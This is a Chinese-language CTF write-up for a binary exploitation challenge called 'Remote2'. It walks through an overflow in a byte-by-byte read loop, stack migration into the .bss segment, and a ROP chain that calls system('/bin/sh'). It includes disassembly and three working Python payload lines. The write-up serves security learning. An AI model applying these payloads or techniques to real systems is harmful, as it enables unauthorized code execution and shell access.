##Remote2

這題雖然沒在時間內解出來，但是在回家路上靈光乍現還是來寫一下好了

P.S 由於**@Brainsp8210**的payload太漂亮了其實可以直接看他的----->[傳送門][brain]：

這題應該要會的，就是一個比較麻煩的**Stack Migration**，只能說自己經驗值不夠，沒有第一時間想到解法Orz

一開始先用`$ file pwn2`看了一下發現是`strip`過的binary，就超級不想看的QQ

`$ ./pwn2`就噴一個`sh: 1: lsh: not found`，然後就停在那不知道在幹嘛，於是用[Qira][qira]追一下，隨便送幾個AAAA然後發現他在做`read`，但是.....他是1 byte 1 byte的讀，然後最多可以讀64bytes，他會用`[rbp-0x4]`的4bytes來判斷現在讀了多少bytes了

	4005a3:       83 45 fc 01             add    DWORD PTR [rbp-0x4],0x1
	4005a7:       83 7d fc 3f             cmp    DWORD PTR [rbp-0x4],0x3f

從這段可以發現，64bytes全部讀完可以剛好蓋到**ret address**控制他的**control flow**

	400582:       8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
	400585:       48 8d 55 d0             lea    rdx,[rbp-0x30]
	400589:       48 01 d0                add    rax,rdx
	40058c:       ba 01 00 00 00          mov    edx,0x1
	400591:       48 89 c6                mov    rsi,rax
	400594:       bf 00 00 00 00          mov    edi,0x0
	400599:       e8 a2 fe ff ff          call   400440 <read@plt>

而且因為他要讀入的地方會受`[rbp-0x4]`而決定，所以也不能透過改那邊的值多蓋幾個bytes，所以就是控制**rbp**還有**ret address**來做到`*Stack Migration*`

payload#1:

```python
payload = 'A'*44 + '\x2c' + '\x00'*3 + p64(buffer1) + p64(read_start)
```
這邊的`'\x2c' + '\x00'*3`是剛好蓋到`rbp-0x4`的地方`0x2c == 44`剛好代表前面已經讀入的44bytes才能讓後面payload順利讀進去stack上，蓋完`'\x2c' + '\x00'*3`後下一格就是`rbp`的位置，為了要達到`*Stack Migration*`，要把`rbp`控制到空的buffer上，也就是控制程式的`Stack Frame`。

找`.bss`段中沒有用到的地方來做寫入

	00601000-00602000 rw-p 00001000 08:01 2878868

可以從後面找，比較不會影響到前面原有的東西，在這裡我的做法需要兩個buffer，然後再buffer1的**ret address**後面蓋成完整的`*ROP Chain*`
	
```python
buffer1 = 0x602000-0x100
buffer2 = buffer1+0x20+0xc
```

這邊的`buffer2`需要特別控制，因為在讀完`buffer1`跟`buffer2`之後需要再跳回`buffer1`之後直接讓他`ret`那邊執行疊好的`*ROP Chain*`，而在跳回`buffer1`時，他一樣會檢查`[rbp-0x4]`的值，因此我們在讀`buffer2`的時候就必須讓他把`rbp-0x4`的內容改成`0x00000000`所以除了將`buffer1`往下拉`0x20`個bytes之外還需要多拉`0xc`這樣寫入的頭就會在`rbp-0x4`的地方

另外還有一個需要特別注意的是，在`call read`的時候程式會在`buffer`的頭減掉`0x8`的地方放上`0x40059e`，在每次call完read之後會執行那段code，重新回到迴圈繼續寫入，因此在buffer2的時候，需要在當前`rsp-0x8`的位置放置`0x40059e`。

payload#2, 3:

```python
r.send('A'*44 + '\x2c' + '\x00'*3 + p64(buffer2) + p64(read_start))
r.send('\x00'*4 + 'A'*8 + p64(read_judge) + p64(sh) + p64(system) + 'A'*8 + '\x2c' + '\x00'*3 + p64(buffer1) + p64(read_start))
```

最後再回到buffer1把ret address蓋成`pop rdi ; ret`，他便會將剛剛放的`address of /bin/sh`pop到rdi然後ret執行`system`便能成功拿到`shell`。

[qira]: https://github.com/BinaryAnalysisPlatform/qira

[brain]: https://github.com/briansp8210